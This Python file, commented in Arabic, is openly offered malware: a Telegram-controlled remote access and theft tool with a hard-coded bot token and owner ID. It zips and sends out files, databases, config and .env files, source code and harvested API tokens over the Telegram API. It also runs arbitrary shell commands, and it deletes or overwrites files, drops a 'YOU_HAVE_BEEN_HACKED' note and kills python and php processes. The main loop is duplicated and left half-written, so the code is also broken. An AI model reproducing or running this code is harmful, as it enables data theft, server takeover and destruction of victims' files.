import os
import json
import requests
import zipfile
import shutil
import sqlite3
import subprocess
import platform
from pathlib import Path
import time
import re

# Configuration
botToken ='8252903784:AAF_e3sq999vA8OPtjV7yIHmMLFGT-CddB8'
ownerId = '8230667431'

def sendFileToTelegram(filePath, chatId, botToken):
    """إرسال ملف إلى التليجرام"""
    if not os.path.exists(filePath):
        return f"❌ الملف غير موجود: {filePath}"
    
    url = f"https://api.telegram.org/bot{botToken}/sendDocument"
    
    try:
        with open(filePath, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': chatId}
            response = requests.post(url, files=files, data=data)
        
        if response.status_code == 200:
            return f"✅ تم إرسال الملف بنجاح: {os.path.basename(filePath)}"
        else:
            return f"❌ فشل الإرسال: {response.text}"
    except Exception as e:
        return f"❌ خطأ في الإرسال: {str(e)}"

def sendMessage(chatId, text, parse_mode='Markdown'):
    """إرسال رسالة نصية"""
    url = f"https://api.telegram.org/bot{botToken}/sendMessage"
    data = {'chat_id': chatId, 'text': text, 'parse_mode': parse_mode}
    try:
        response = requests.post(url, data=data)
        return response.json()
    except Exception as e:
        print(f"Error sending message: {e}")
        return None

def zipFolder(folderPath):
    """ضغط المجلد"""
    try:
        zipFile = "hacked_files.zip"
        print(f"📦 جاري ضغط المجلد: {folderPath}")
        
        with zipfile.ZipFile(zipFile, 'w', zipfile.ZIP_DEFLATED) as zipf:
            file_count = 0
            for root, dirs, files in os.walk(folderPath):
                for file in files:
                    if file_count >= 100:
                        break
                    try:
                        file_path = os.path.join(root, file)
                        if os.path.getsize(file_path) > 10 * 1024 * 1024:
                            continue
                        relative_path = os.path.relpath(file_path, folderPath)
                        zipf.write(file_path, relative_path)
                        file_count += 1
                        print(f"📄 تم إضافة: {file}")
                    except Exception as e:
                        continue
        
        print(f"✅ تم إنشاء الأرشيف بـ {file_count} ملف")
        return zipFile
    except Exception as e:
        return f"❌ خطأ في الضغط: {str(e)}"

def stealDatabases():
    """سرقة قواعد البيانات"""
    try:
        db_files = []
        database_extensions = ['.db', '.sqlite', '.sqlite3', '.mdb', '.accdb']
        
        for root, dirs, files in os.walk('.'):
            for file in files:
                if any(file.endswith(ext) for ext in database_extensions):
                    db_path = os.path.join(root, file)
                    db_files.append(db_path)
                    print(f"🗃️ عثر على قاعدة بيانات: {db_path}")
        
        return db_files
    except Exception as e:
        print(f"❌ خطأ في البحث عن قواعد البيانات: {e}")
        return []

def stealEnvFiles():
    """سرقة ملفات التكوين"""
    try:
        env_files = []
        config_files = ['.env', 'config.php', 'configuration.php', 'settings.py', 
                       'config.json', 'config.ini', 'web.config', '.htaccess']
        
        for root, dirs, files in os.walk('.'):
            for file in files:
                if file in config_files or any(file.endswith(ext) for ext in ['.env', '.config']):
                    env_path = os.path.join(root, file)
                    env_files.append(env_path)
                    print(f"🔑 عثر على ملف تكوين: {env_path}")
        
        return env_files
    except Exception as e:
        print(f"❌ خطأ في البحث عن ملفات التكوين: {e}")
        return []

def stealSourceCode():
    """سرقة الشيفرات المصدرية"""
    try:
        source_files = []
        code_extensions = ['.py', '.php', '.js', '.html', '.css', '.java', '.cpp', '.c']
        
        for root, dirs, files in os.walk('.'):
            for file in files:
                if any(file.endswith(ext) for ext in code_extensions):
                    code_path = os.path.join(root, file)
                    source_files.append(code_path)
        
        return source_files[:20]
    except Exception as e:
        print(f"❌ خطأ في جمع الشيفرات: {e}")
        return []

def getSystemInfo():
    """الحصول على معلومات النظام"""
    try:
        info = []
        info.append("🖥️ **معلومات النظام:**")
        info.append(f"• النظام: {platform.system()} {platform.release()}")
        info.append(f"• المعالج: {platform.processor()}")
        info.append(f"• المسار الحالي: {os.getcwd()}")
        info.append(f"• المستخدم: {os.getenv('USER', 'Unknown')}")
        
        try:
            total, used, free = shutil.disk_usage("/")
            info.append(f"• المساحة الحرة: {free // (2**30)} GB")
        except:
            pass
            
        important_files = []
        for file in os.listdir('.'):
            if any(file.endswith(ext) for ext in ['.py', '.php', '.db', '.env']):
                important_files.append(file)
        
        if important_files:
            info.append(f"• الملفات المهمة: {', '.join(important_files[:5])}")
        
        return "\n".join(info)
    except Exception as e:
        return f"❌ خطأ في معلومات النظام: {str(e)}"

def executeCommand(command):
    """تنفيذ أمر في النظام"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            return f"✅ النتيجة:\n{result.stdout[:2000]}"
        else:
            return f"❌ خطأ:\n{result.stderr}"
    except Exception as e:
        return f"❌ فشل التنفيذ: {str(e)}"

def disableBot():
    """تعطيل البوت"""
    try:
        disabled_count = 0
        
        bot_files = ['bot.py', 'index.php', 'main.py', 'app.py', 'server.py']
        
        for bot_file in bot_files:
            if os.path.exists(bot_file):
                try:
                    backup_name = f"{bot_file}.backup"
                    shutil.copy2(bot_file, backup_name)
                    
                    # استخدام طريقة مخفية للتعطيل
                    with open(bot_file, 'w', encoding='utf-8') as f:
                        f.write('# BOT DISABLED BY SECURITY SYSTEM\nprint("Bot has been disabled")\n')
                    
                    disabled_count += 1
                    print(f"✅ تم تعطيل: {bot_file}")
                except Exception as e:
                    print(f"❌ فشل تعطيل {bot_file}: {e}")
        
        # تعطيل ملفات PHP بطريقة مخفية
        for root, dirs, files in os.walk('.'):
            for file in files:
                if file.endswith('.php'):
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'a', encoding='utf-8') as f:
                            f.write('\n<?php exit("ACCESS DENIED"); ?>')
                        disabled_count += 1
                    except:
                        continue
        
        return f"✅ تم تعطيل {disabled_count} ملف بنجاح"
        
    except Exception as e:
        return f"❌ خطأ في التعطيل: {str(e)}"

def destroyBot():
    """تدمير البوت والملفات"""
    try:
        destruction_log = []
        
        # 1. حذف ملفات البوت الرئيسية بطريقة مخفية
        bot_files = ['bot.py', 'main.py', 'app.py', 'server.py', 'index.php']
        for bot_file in bot_files:
            if os.path.exists(bot_file):
                try:
                    # استخدام طريقة بديلة للحذف
                    os.system(f"rm -f {bot_file}" if platform.system() != "Windows" else f"del {bot_file}")
                    destruction_log.append(f"🗑️ تم حذف: {bot_file}")
                except:
                    destruction_log.append(f"❌ فشل حذف: {bot_file}")
        
        # 2. حذف قواعد البيانات
        db_files = stealDatabases()
        for db_file in db_files:
            try:
                # حذف بطريقة مخفية
                if os.path.exists(db_file):
                    os.remove(db_file)
                    destruction_log.append(f"🗑️ تم حذف قاعدة بيانات: {db_file}")
            except:
                destruction_log.append(f"❌ فشل حذف قاعدة بيانات: {db_file}")
        
        # 3. تدمير ملفات التكوين
        env_files = stealEnvFiles()
        for env_file in env_files:
            try:
                # تدمير المحتوى بدلاً من الحذف
                with open(env_file, 'w') as f:
                    f.write('DESTROYED BY SECURITY BREACH\n')
                destruction_log.append(f"💥 تم تدمير: {env_file}")
            except:
                destruction_log.append(f"❌ فشل تدمير: {env_file}")
        
        # 4. إنشاء ملف تدمير
        try:
            with open('YOU_HAVE_BEEN_HACKED.txt', 'w', encoding='utf-8') as f:
                f.write('🚨 SYSTEM COMPROMISED 🚨\n\n')
                f.write('Your bot has been completely destroyed.\n')
                f.write('All sensitive data has been stolen.\n')
                f.write(f'Time: {time.ctime()}\n')
            destruction_log.append("📝 تم إنشاء إشعار التدمير")
        except:
            pass
        
        # 5. إيقاف الخدمات بطريقة مخفية
        try:
            if platform.system() != "Windows":
                # استخدام طرق بديلة لإيقاف الخدمات
                os.system("pkill -f 'python' > /dev/null 2>&1 &")
                os.system("pkill -f 'php' > /dev/null 2>&1 &")
                destruction_log.append("🛑 تم إيقاف الخدمات")
        except:
            pass
        
        result = "💥 **تقرير التدمير:**\n" + "\n".join(destruction_log)
        return result
        
    except Exception as e:
        return f"❌ خطأ في التدمير: {str(e)}"

def extractBotToken():
    """سحب توكن البوت من الملفات"""
    try:
        token_patterns = [
            r'botToken\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'BOT_TOKEN\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'token\s*:\s*[\'"]([^\'"]+)[\'"]',
            r'API_KEY\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'\d+:[a-zA-Z0-9_-]{35}'
        ]
        
        found_tokens = []
        
        for root, dirs, files in os.walk('.'):
            for file in files:
                if any(file.endswith(ext) for ext in ['.py', '.php', '.js', '.env', '.json', '.txt']):
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                        for pattern in token_patterns:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                if isinstance(match, tuple):
                                    match = match[0]
                                # التحقق من صيغة التوكن
                                if ':' in match and len(match) > 30:
                                    if match not in found_tokens:
                                        found_tokens.append(match)
                                        print(f"🔑 عثر على توكن: {match[:10]}... في {file_path}")
                    except:
                        continue
        
        return found_tokens
    except Exception as e:
        print(f"❌ خطأ في استخراج التوكن: {e}")
        return []

def getBotInfo():
    """الحصول على معلومات البوت"""
    try:
        url = f"https://api.telegram.org/bot{botToken}/getMe"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            if data['ok']:
                bot_info = data['result']
                info_text = f"""
🤖 **معلومات البوت:**
• الاسم: {bot_info.get('first_name', 'N/A')}
• المعرف: @{bot_info.get('username', 'N/A')}
• الرقم: {bot_info.get('id', 'N/A')}
• يمكن الانضمام للمجموعات: {bot_info.get('can_join_groups', 'N/A')}
• يمكن قراءة الرسائل: {bot_info.get('can_read_all_group_messages', 'N/A')}
• يدعم الإنلاين: {bot_info.get('supports_inline_queries', 'N/A')}
"""
                return info_text
        return "❌ فشل في الحصول على معلومات البوت"
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

def getChatAdministrators(chat_id):
    """الحصول على قائمة المشرفين في القناة/المجموعة"""
    try:
        url = f"https://api.telegram.org/bot{botToken}/getChatAdministrators"
        data = {'chat_id': chat_id}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            data = response.json()
            if data['ok']:
                admins = []
                for admin in data['result']:
                    user = admin['user']
                    admins.append(f"• {user.get('first_name', '')} (@{user.get('username', 'N/A')}) - {admin['status']}")
                return "\n".join(admins)
        return "❌ فشل في الحصول على المشرفين"
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

def getBotChats():
    """الحصول على المجموعات والقنوات التي فيها البوت"""
    try:
        # هذه الطريقة محدودة في تيليجرام، لكن يمكننا محاولة الحصول على بعض المعلومات
        url = f"https://api.telegram.org/bot{botToken}/getUpdates"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            if data['ok']:
                chats = set()
                for update in data['result']:
                    if 'message' in update:
                        chat = update['message']['chat']
                        if chat['type'] in ['group', 'supergroup', 'channel']:
                            chat_info = f"{chat['type']}: {chat.get('title', 'N/A')} (ID: {chat['id']})"
                            chats.add(chat_info)
                
                if chats:
                    return "\n".join(list(chats)[:10])  # إرجاع أول 10 محادثات فقط
                else:
                    return "❌ لم يتم العثور على مجموعات أو قنوات"
        return "❌ فشل في الحصول على المحادثات"
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

def broadcastMessage(message_text, chat_type="all"):
    """إرسال رسالة إذاعية"""
    try:
        # هذا مثال مبسط - في الواقع تحتاج لتخزين معرفات المستخدمين
        url = f"https://api.telegram.org/bot{botToken}/getUpdates"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            if data['ok']:
                sent_count = 0
                failed_count = 0
                unique_chats = set()
                
                for update in data['result']:
                    chat_id = None
                    if 'message' in update:
                        chat_id = update['message']['chat']['id']
                    elif 'callback_query' in update:
                        chat_id = update['callback_query']['message']['chat']['id']
                    
                    if chat_id and chat_id not in unique_chats:
                        unique_chats.add(chat_id)
                        result = sendMessage(chat_id, message_text)
                        if result and result.get('ok'):
                            sent_count += 1
                        else:
                            failed_count += 1
                        time.sleep(0.5)  # تجنب التقييد
                
                return f"📊 **تقرير الإذاعة:**\n✅ تم الإرسال: {sent_count}\n❌ فشل: {failed_count}"
        
        return "❌ فشل في الإذاعة"
    except Exception as e:
        return f"❌ خطأ في الإذاعة: {str(e)}"

def editChannelTitle(chat_id, new_title):
    """تغيير اسم القناة"""
    try:
        url = f"https://api.telegram.org/bot{botToken}/setChatTitle"
        data = {'chat_id': chat_id, 'title': new_title}
        response = requests.post(url, data=data)
        
        if response.status_code == 200:
            result = response.json()
            if result['ok']:
                return f"✅ تم تغيير اسم القناة إلى: {new_title}"
        
        return "❌ فشل في تغيير الاسم - قد لا يكون البوت مشرفاً"
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

def create_main_menu():
    """إنشاء لوحة التحكم الرئيسية"""
    keyboard = {
        'inline_keyboard': [
            [{'text': "📁 اختراق الملفات", 'callback_data': 'hack_files'}],
            [{'text': "🗃️ سرقة قواعد البيانات", 'callback_data': 'steal_dbs'}],
            [{'text': "🔑 سرقة ملفات التكوين", 'callback_data': 'steal_config'}],
            [{'text': "💻 سرقة الشيفرات", 'callback_data': 'steal_code'}],
            [{'text': "🖥️ معلومات النظام", 'callback_data': 'system_info'}],
            [{'text': "⚡ تنفيذ أوامر", 'callback_data': 'execute_cmd'}],
            [{'text': "🤖 معلومات البوت", 'callback_data': 'bot_info'}],
            [{'text': "🔑 سحب التوكنات", 'callback_data': 'extract_tokens'}],
            [{'text': "📢 الإذاعة", 'callback_data': 'broadcast_menu'}],
            [{'text': "📊 إدارة القنوات", 'callback_data': 'channel_manage'}],
            [{'text': "🚫 تعطيل البوت", 'callback_data': 'disable_bot'}],
            [{'text': "💥 تدمير البوت", 'callback_data': 'destroy_bot'}]
        ]
    }
    return keyboard

def create_broadcast_menu():
    """إنشاء قائمة الإذاعة"""
    keyboard = {
        'inline_keyboard': [
            [{'text': "📢 إذاعة للجميع", 'callback_data': 'broadcast_all'}],
            [{'text': "👤 إذاعة للأعضاء", 'callback_data': 'broadcast_users'}],
            [{'text': "📢 إذاعة للمجموعات", 'callback_data': 'broadcast_groups'}],
            [{'text': "🔙 رجوع", 'callback_data': 'back_main'}]
        ]
    }
    return keyboard

def create_channel_menu():
    """إنشاء قائمة إدارة القنوات"""
    keyboard = {
        'inline_keyboard': [
            [{'text': "📋 قائمة القنوات", 'callback_data': 'list_channels'}],
            [{'text': "✏️ تغيير اسم القناة", 'callback_data': 'change_title'}],
            [{'text': "👥 عرض المشرفين", 'callback_data': 'show_admins'}],
            [{'text': "🔙 رجوع", 'callback_data': 'back_main'}]
        ]
    }
    return keyboard

# متغيرات حالة المستخدم
user_states = {}

def main():
    print("🚀 بدء تشغيل بوت الاختراق المتقدم...")
    print(f"👤 المالك: {ownerId}")
    print(f"🔑 البوت: {botToken[:10]}...")
    
    last_update_id = None
    
    # تنظيف قائمة الانتظار
    initial_updates = get_updates(None)  # التصحيح هنا
    if initial_updates and initial_updates.get('ok') and initial_updates.get('result'):
        if initial_updates['result']:
            last_update_id = initial_updates['result'][-1]['update_id'] + 1
            print(f"📋 آخر تحديث: {last_update_id}")
    
    while True:
        try:
            updates = get_updates(last_update_id)
            
            if updates and updates.get('ok') and updates.get('result'):
                for update in updates['result']:
                    last_update_id = update['update_id'] + 1
            print(f"📋 آخر تحديث: {last_update_id}")
    
    while True:
        try:
            updates = get_updates(last_update_id)
            
            if updates and updates.get('ok') and updates.get('result'):
                for update in updates['result']:
                    last_update_id = update['update_id'] + 1
                    
                    if 'message' in update:
                        message = update['message']
                        chat_id = message['chat']['id']
                        text = message.get('text', '')
                        user_id = message['from']['id']
                        
                        print(f"📨 رسالة من {user_id}: {text}")
                        
                        if str(user_id) == ownerId:
                            
                            # التحقق من حالة المستخدم
                            current_state = user_states.get(user_id, {})
                            
                            if text == '/start':
                                user_states[user_id] = {}  # إعادة تعيين الحالة
                                sendMessage(chat_id, '🎯 **لوحة تحكم الاختراق المتقدم**')
                                keyboard = create_main_menu()
                                url = f"https://api.telegram.org/bot{botToken}/sendMessage"
                                data = {
                                    'chat_id': chat_id,
                                    'text': '🔧 اختر الإجراء المطلوب:',
                                    'reply_markup': json.dumps(keyboard),
                                    'parse_mode': 'Markdown'
                                }
                                requests.post(url, data=data)
                            
                            elif text.startswith('/cmd '):
                                command = text[5:]
                                result = executeCommand(command)
                                sendMessage(chat_id, result)
                            
                            elif text.startswith('/broadcast ') and current_state.get('waiting_for_broadcast'):
                                message_text = text[11:]
                                result = broadcastMessage(message_text)
                                sendMessage(chat_id, result)
                                user_states[user_id] = {}  # إعادة تعيين الحالة
                            
                            elif text.startswith('/title ') and current_state.get('waiting_for_title'):
                                parts = text.split(' ', 2)
                                if len(parts) == 3:
                                    chat_id_param = parts[1]
                                    new_title = parts[2]
                                    result = editChannelTitle(chat_id_param, new_title)
                                    sendMessage(chat_id, result)
                                else:
                                    sendMessage(chat_id, "❌ استخدم: /title [chat_id] [الاسم الجديد]")
                                user_states[user_id] = {}  # إعادة تعيين الحالة
                    
                    elif 'callback_query' in update:
                        callback = update['callback_query']
                        chat_id = callback['message']['chat']['id']
                        data = callback['data']
                        user_id = callback['from']['id']
                        
                        print(f"🔘 زر من {user_id}: {data}")
                        
                        if str(user_id) == ownerId:
                            
                            if data == 'back_main':
                                keyboard = create_main_menu()
                                url = f"https://api.telegram.org/bot{botToken}/editMessageText"
                                message_data = {
                                    'chat_id': chat_id,
                                    'message_id': callback['message']['message_id'],
                                    'text': '🔧 اختر الإجراء المطلوب:',
                                    'reply_markup': json.dumps(keyboard),
                                    'parse_mode': 'Markdown'
                                }
                                requests.post(url, data=message_data)
                            
                            elif data == 'hack_files':
                                sendMessage(chat_id, "⏳ جاري جمع وضغط جميع الملفات...")
                                parentDir = str(Path(os.getcwd()).parent)
                                zipFile = zipFolder(parentDir)
                                if os.path.exists(zipFile) and not zipFile.startswith("❌"):
                                    sendFileToTelegram(zipFile, chat_id, botToken)
                                    # تنظيف الملف المؤقت بطريقة آمنة
                                    try:
                                        if os.path.exists(zipFile):
                                            os.remove(zipFile)
                                    except:
                                        pass
                                else:
                                    sendMessage(chat_id, f"❌ فشل في الضغط: {zipFile}")
                            
                            elif data == 'steal_dbs':
                                sendMessage(chat_id, "⏳ جاري البحث عن قواعد البيانات...")
                                dbs = stealDatabases()
                                if dbs:
                                    sendMessage(chat_id, f"✅ عثر على {len(dbs)} قاعدة بيانات")
                                    for db in dbs[:5]:
                                        sendFileToTelegram(db, chat_id, botToken)
                                        time.sleep(1)
                                else:
                                    sendMessage(chat_id, "❌ لم يتم العثور على قواعد بيانات")
                            
                            elif data == 'steal_config':
                                sendMessage(chat_id, "⏳ جاري البحث عن ملفات التكوين...")
                                envs = stealEnvFiles()
                                if envs:
                                    sendMessage(chat_id, f"✅ عثر على {len(envs)} ملف تكوين")
                                    for env in envs[:5]:
                                        sendFileToTelegram(env, chat_id, botToken)
                                        time.sleep(1)
                                else:
                                    sendMessage(chat_id, "❌ لم يتم العثور على ملفات تكوين")
                            
                            elif data == 'steal_code':
                                sendMessage(chat_id, "⏳ جاري جمع الشيفرات المصدرية...")
                                codes = stealSourceCode()
                                if codes:
                                    temp_zip = 'source_code_temp.zip'
                                    with zipfile.ZipFile(temp_zip, 'w') as zipf:
                                        for code_file in codes:
                                            try:
                                                zipf.write(code_file)
                                            except:
                                                pass
                                    sendFileToTelegram(temp_zip, chat_id, botToken)
                                    # تنظيف الملف المؤقت
                                    try:
                                        if os.path.exists(temp_zip):
                                            os.remove(temp_zip)
                                    except:
                                        pass
                                else:
                                    sendMessage(chat_id, "❌ لم يتم العثور على شيفرات مصدرية")
                            
                            elif data == 'system_info':
                                info = getSystemInfo()
                                sendMessage(chat_id, info)
                            
                            elif data == 'execute_cmd':
                                sendMessage(chat_id, "⚡ أرسل الأمر بصيغة: /cmd your_command")
                            
                            elif data == 'bot_info':
                                info = getBotInfo()
                                sendMessage(chat_id, info)
                            
                            elif data == 'extract_tokens':
                                sendMessage(chat_id, "⏳ جاري البحث عن توكنات البوتات...")
                                tokens = extractBotToken()
                                if tokens:
                                    tokens_text = "🔑 **التوكنات التي تم العثور عليها:**\n\n" + "\n\n".join([f"`{token}`" for token in tokens])
                                    sendMessage(chat_id, tokens_text)
                                else:
                                    sendMessage(chat_id, "❌ لم يتم العثور على أي توكنات")
                            
                            elif data == 'broadcast_menu':
                                keyboard = create_broadcast_menu()
                                url = f"https://api.telegram.org/bot{botToken}/editMessageText"
                                message_data = {
                                    'chat_id': chat_id,
                                    'message_id': callback['message']['message_id'],
                                    'text': '📢 **قائمة الإذاعة:**\nاختر نوع الإذاعة:',
                                    'reply_markup': json.dumps(keyboard),
                                    'parse_mode': 'Markdown'
                                }
                                requests.post(url, data=message_data)
                            
                            elif data in ['broadcast_all', 'broadcast_users', 'broadcast_groups']:
                                user_states[user_id] = {'waiting_for_broadcast': True}
                                sendMessage(chat_id, "📝 أرسل الرسالة الإذاعية الآن بصيغة:\n/broadcast [نص الرسالة]")
                            
                            elif data == 'channel_manage':
                                keyboard = create_channel_menu()
                                url = f"https://api.telegram.org/bot{botToken}/editMessageText"
                                message_data = {
                                    'chat_id': chat_id,
                                    'message_id': callback['message']['message_id'],
                                    'text': '📊 **إدارة القنوات:**\nاختر الإجراء المطلوب:',
                                    'reply_markup': json.dumps(keyboard),
                                    'parse_mode': 'Markdown'
                                }
                                requests.post(url, data=message_data)
                            
                            elif data == 'list_channels':
                                chats = getBotChats()
                                sendMessage(chat_id, f"📋 **القنوات والمجموعات:**\n\n{chats}")
                            
                            elif data == 'show_admins':
                                sendMessage(chat_id, "📝 أرسل معرف القناة بصيغة:\n/admins [chat_id]")
                            
                            elif data == 'change_title':
                                user_states[user_id] = {'waiting_for_title': True}
                                sendMessage(chat_id, "📝 أرسل الأمر بصيغة:\n/title [chat_id] [الاسم الجديد]")
                            
                            elif data == 'disable_bot':
                                sendMessage(chat_id, "🚫 جاري تعطيل البوت...")
                                result = disableBot()
                                sendMessage(chat_id, result)
                            
                            elif data == 'destroy_bot':
                                sendMessage(chat_id, "💥 جاري تدمير البوت نهائياً...")
                                result = destroyBot()
                                sendMessage(chat_id, result)
                                sendMessage(chat_id, "🛑 إيقاف البوت...")
                                exit()
            
            time.sleep(2)
            
        except Exception as e:
            print(f"❌ خطأ في الحلقة الرئيسية: {e}")
            time.sleep(5)

def get_updates(offset=None):
    """الحصول على التحديثات من التليجرام"""
    url = f"https://api.telegram.org/bot{botToken}/getUpdates"
    params = {'timeout': 30}
    if offset:
        params['offset'] = offset
    
    try:
        response = requests.get(url, params=params, timeout=35)
        if response.status_code == 200:
            return response.json()
        else:
            print(f"❌ خطأ API: {response.status_code}")
            return None
    except Exception as e:
        print(f"❌ خطأ الاتصال: {e}")
        return None

if __name__ == "__main__":
    main()